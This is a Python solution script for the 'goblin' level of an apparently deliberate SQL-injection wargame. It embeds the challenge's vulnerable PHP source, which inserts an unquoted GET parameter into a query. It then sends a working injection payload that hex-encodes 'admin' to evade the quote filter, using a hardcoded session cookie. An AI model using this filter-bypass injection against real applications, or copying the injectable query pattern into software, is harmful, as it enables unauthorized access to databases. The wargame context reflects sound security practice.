import requests

"""
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
"""
url = "https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php"
payload = {"no":"0 or id=0x61646d696e #"} # cenvert strings to hex to avoid filtering "'"
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
r = requests.get(url,params=payload,cookies=cookie)
#print(r.text)
if 'Clear' in r.text:
    print("clear")
else:
    print("try again")